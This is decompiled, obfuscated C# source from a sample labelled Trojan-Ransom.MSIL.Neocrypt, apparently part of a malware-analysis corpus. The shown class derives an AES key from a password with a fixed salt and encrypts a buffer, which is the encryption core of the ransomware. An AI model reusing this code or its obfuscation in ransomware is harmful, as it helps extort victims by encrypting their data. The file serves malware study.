// Decompiled with JetBrains decompiler
// Type: #Hf.#bj
// Assembly: LoadAssembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=489de906037d8a94
// MVID: B46B9881-0285-4729-849C-7A9813852236
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.MSIL.Neocrypt.c-d581e010b258e8f3cf3f45557eb29795dc6fc39a9eccfcbf12c2b372afcb6e03.exe

using \u0023Hf;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0023Hf
{
  internal class \u0023bj
  {
    private static byte[] \u0023Ng([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      MemoryStream memoryStream;
      CryptoStream cryptoStream;
      while (true)
      {
        memoryStream = new MemoryStream();
        if (true)
        {
          Rijndael rijndael = \u0005.\u0005();
          if (true)
          {
            \u0006.\u007E\u0006((object) rijndael, obj1);
            if (true)
              \u0006.\u007E\u0007((object) rijndael, obj2);
            else
              goto label_8;
          }
          if (true)
          {
            cryptoStream = new CryptoStream((Stream) memoryStream, \u0007.\u007E\u0008((object) rijndael), CryptoStreamMode.Write);
            break;
          }
        }
        else
          goto label_7;
      }
      \u0008.\u007E\u000E((object) cryptoStream, obj0, 0, obj0.Length);
label_7:
      \u000E.\u007E\u000F((object) cryptoStream);
      byte[] numArray = \u000F.\u007E\u0011((object) memoryStream);
label_8:
      return numArray;
    }

    public static byte[] \u0023aj([In] byte[] obj0, [In] string obj1)
    {
      byte[] numArray;
      if (true)
      {
        if (true)
          goto label_4;
label_2:
        PasswordDeriveBytes passwordDeriveBytes;
        if (true)
        {
          numArray = \u0023bj.\u0023Ng(obj0, \u0011.\u007E\u0013((object) passwordDeriveBytes, 32), \u0011.\u007E\u0013((object) passwordDeriveBytes, 16));
          goto label_3;
        }
        else
          goto label_3;
label_4:
        string strPassword = obj1;
        byte[] rgbSalt = new byte[13];
        // ISSUE: field reference
        RuntimeFieldHandle fldHandle = __fieldref (\u0023ej.\u0023gj);
        if (true)
          RuntimeHelpers.InitializeArray((Array) rgbSalt, fldHandle);
        passwordDeriveBytes = new PasswordDeriveBytes(strPassword, rgbSalt);
        goto label_2;
      }
label_3:
      return numArray;
    }
  }
}
